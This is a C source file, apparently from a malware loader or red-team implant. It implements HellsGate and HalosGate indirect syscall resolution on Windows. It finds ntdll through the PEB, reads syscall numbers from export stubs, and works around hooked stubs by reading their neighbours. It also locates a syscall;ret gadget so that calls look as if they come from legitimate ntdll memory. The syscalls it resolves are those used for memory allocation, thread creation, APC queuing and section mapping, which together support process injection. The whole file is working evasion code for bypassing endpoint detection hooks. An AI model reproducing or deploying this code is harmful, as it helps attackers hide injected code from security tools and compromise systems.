/*
 * syscalls.c - HellsGate + HalosGate indirect syscall resolver
 *
 * Resolves syscall numbers (SSN) at runtime by parsing ntdll.dll's
 * export address table and reading stub opcodes.  If a stub is hooked
 * (pattern mismatch), neighbouring stubs are searched to extrapolate
 * the correct SSN (HalosGate technique).
 *
 * A syscall;ret gadget inside ntdll's .text section is located for
 * use as the indirect jump target, so the syscall instruction always
 * executes from legitimate ntdll memory.
 *
 * Build flag: -DUSE_INDIRECT_SYSCALLS
 */

#include "config.h"
#if USE_INDIRECT_SYSCALLS

#include "syscalls.h"
#include <winternl.h>

/* ------------------------------------------------------------------ */
/*  Global syscall entries referenced by the assembly stubs            */
/* ------------------------------------------------------------------ */

syscall_entry_t sc_NtAllocateVirtualMemory;
syscall_entry_t sc_NtProtectVirtualMemory;
syscall_entry_t sc_NtCreateThreadEx;
syscall_entry_t sc_NtQueueApcThread;
syscall_entry_t sc_NtTestAlert;
syscall_entry_t sc_NtWaitForSingleObject;
syscall_entry_t sc_NtCreateSection;
syscall_entry_t sc_NtMapViewOfSection;

/* ------------------------------------------------------------------ */
/*  Internal helpers                                                   */
/* ------------------------------------------------------------------ */

/*
 * Get ntdll base address from the PEB loader data.
 * Avoids calling GetModuleHandle which itself may be hooked.
 */
static PVOID get_ntdll_base(void) {
    PPEB peb;
#if defined(__GNUC__) || defined(__clang__)
    __asm__ volatile ("mov %0, gs:[0x60]" : "=r"(peb));
#else
    peb = (PPEB)__readgsqword(0x60);
#endif

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    /* Walk the in-memory-order list; ntdll is typically the second
       entry (after the executable itself). */
    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
            entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        /* Compare the base DLL name case-insensitively for "ntdll.dll" */
        if (mod->FullDllName.Length >= 9 * sizeof(WCHAR)) {
            PWCHAR name = mod->FullDllName.Buffer;
            /* Walk to the filename portion */
            PWCHAR p = name;
            PWCHAR last_sep = name;
            while (*p) {
                if (*p == L'\\' || *p == L'/')
                    last_sep = p + 1;
                p++;
            }
            /* Case-insensitive check for "ntdll.dll" */
            if ((last_sep[0] | 0x20) == L'n' &&
                (last_sep[1] | 0x20) == L't' &&
                (last_sep[2] | 0x20) == L'd' &&
                (last_sep[3] | 0x20) == L'l' &&
                (last_sep[4] | 0x20) == L'l' &&
                 last_sep[5]         == L'.' &&
                (last_sep[6] | 0x20) == L'd' &&
                (last_sep[7] | 0x20) == L'l' &&
                (last_sep[8] | 0x20) == L'l') {
                return mod->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return NULL;
}

/*
 * Inline string comparison (avoids CRT dependency).
 */
static int sc_strcmp(const char *a, const char *b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

/*
 * Find the .text section boundaries of ntdll for gadget scanning.
 */
static BOOL find_text_section(PVOID base, PBYTE *text_start, DWORD *text_size) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
            sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
            sec[i].Name[4] == 't') {
            *text_start = (PBYTE)base + sec[i].VirtualAddress;
            *text_size  = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/*
 * Scan ntdll .text for a syscall;ret (0F 05 C3) gadget.
 * Returns the address of the 0F 05 bytes.
 */
static PVOID find_syscall_gadget(PVOID base) {
    PBYTE text_start = NULL;
    DWORD text_size  = 0;

    if (!find_text_section(base, &text_start, &text_size))
        return NULL;

    /* Search for: syscall (0F 05) followed by ret (C3) */
    for (DWORD i = 0; i < text_size - 2; i++) {
        if (text_start[i]     == 0x0F &&
            text_start[i + 1] == 0x05 &&
            text_start[i + 2] == 0xC3) {
            return &text_start[i];
        }
    }
    return NULL;
}

/*
 * Locate a function's address within ntdll by walking the EAT.
 * Returns the address (inside ntdll) of the function, or NULL.
 */
static PVOID find_export(PVOID base, const char *name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);

    DWORD eat_rva = nt->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!eat_rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)base + eat_rva);

    PDWORD names   = (PDWORD)((PBYTE)base + eat->AddressOfNames);
    PWORD  ordinals = (PWORD)((PBYTE)base + eat->AddressOfNameOrdinals);
    PDWORD funcs    = (PDWORD)((PBYTE)base + eat->AddressOfFunctions);

    for (DWORD i = 0; i < eat->NumberOfNames; i++) {
        const char *fn_name = (const char *)((PBYTE)base + names[i]);
        if (sc_strcmp(fn_name, name) == 0) {
            return (PVOID)((PBYTE)base + funcs[ordinals[i]]);
        }
    }
    return NULL;
}

/*
 * HellsGate: extract the SSN from an unhooked Nt* stub.
 *
 * Expected pattern (x64):
 *   4C 8B D1          mov r10, rcx
 *   B8 xx xx 00 00    mov eax, <SSN>
 *
 * Returns TRUE if the pattern matches and *ssn is set.
 */
static BOOL extract_ssn(PBYTE stub, DWORD *ssn) {
    /* 4C 8B D1 = mov r10, rcx */
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        /* B8 xx xx 00 00 = mov eax, imm32 (low SSN) */
        stub[3] == 0xB8 &&
        stub[6] == 0x00 && stub[7] == 0x00) {
        *ssn = *(DWORD *)(stub + 4);
        return TRUE;
    }
    return FALSE;
}

/*
 * HalosGate: if the target stub is hooked, search neighbouring
 * syscall stubs to extrapolate the SSN.
 *
 * Each Nt* stub in ntdll is typically 32 bytes apart on x64.
 * We search up to 512 neighbours in each direction.
 */
#define STUB_STRIDE 32
#define MAX_NEIGHBOUR_SEARCH 512

static BOOL halos_gate(PVOID base, PBYTE target_stub, DWORD *ssn) {
    DWORD neighbour_ssn;

    /* Search downward (higher addresses = higher SSNs) */
    for (int i = 1; i <= MAX_NEIGHBOUR_SEARCH; i++) {
        PBYTE down = target_stub + (i * STUB_STRIDE);
        if (extract_ssn(down, &neighbour_ssn)) {
            *ssn = neighbour_ssn - (DWORD)i;
            return TRUE;
        }
    }

    /* Search upward (lower addresses = lower SSNs) */
    for (int i = 1; i <= MAX_NEIGHBOUR_SEARCH; i++) {
        PBYTE up = target_stub - (i * STUB_STRIDE);
        if (extract_ssn(up, &neighbour_ssn)) {
            *ssn = neighbour_ssn + (DWORD)i;
            return TRUE;
        }
    }

    return FALSE;
}

/* ------------------------------------------------------------------ */
/*  Public API                                                         */
/* ------------------------------------------------------------------ */

/*
 * Cached ntdll base and syscall gadget (resolved once).
 */
static PVOID   s_ntdll_base   = NULL;
static PVOID   s_syscall_addr = NULL;
static BOOL    s_init_done    = FALSE;

static BOOL ensure_init(void) {
    if (s_init_done) return (s_ntdll_base != NULL);

    s_init_done    = TRUE;
    s_ntdll_base   = get_ntdll_base();
    if (!s_ntdll_base) return FALSE;

    s_syscall_addr = find_syscall_gadget(s_ntdll_base);
    if (!s_syscall_addr) return FALSE;

    return TRUE;
}

BOOL resolve_syscall(const char *name, syscall_entry_t *entry) {
    if (!ensure_init()) return FALSE;

    PVOID func = find_export(s_ntdll_base, name);
    if (!func) return FALSE;

    DWORD ssn = 0;

    /* Try HellsGate first (unhooked stub) */
    if (!extract_ssn((PBYTE)func, &ssn)) {
        /* Stub is hooked; fall back to HalosGate */
        if (!halos_gate(s_ntdll_base, (PBYTE)func, &ssn))
            return FALSE;
    }

    entry->ssn          = ssn;
    entry->syscall_addr = s_syscall_addr;
    return TRUE;
}

BOOL syscalls_init(void) {
    static const struct {
        const char     *name;
        syscall_entry_t *entry;
    } table[] = {
        { "NtAllocateVirtualMemory",  &sc_NtAllocateVirtualMemory  },
        { "NtProtectVirtualMemory",   &sc_NtProtectVirtualMemory   },
        { "NtCreateThreadEx",         &sc_NtCreateThreadEx         },
        { "NtQueueApcThread",         &sc_NtQueueApcThread         },
        { "NtTestAlert",              &sc_NtTestAlert              },
        { "NtWaitForSingleObject",    &sc_NtWaitForSingleObject    },
        { "NtCreateSection",          &sc_NtCreateSection          },
        { "NtMapViewOfSection",       &sc_NtMapViewOfSection       },
        { NULL, NULL }
    };

    for (int i = 0; table[i].name != NULL; i++) {
        if (!resolve_syscall(table[i].name, table[i].entry))
            return FALSE;
    }
    return TRUE;
}

#endif /* USE_INDIRECT_SYSCALLS */
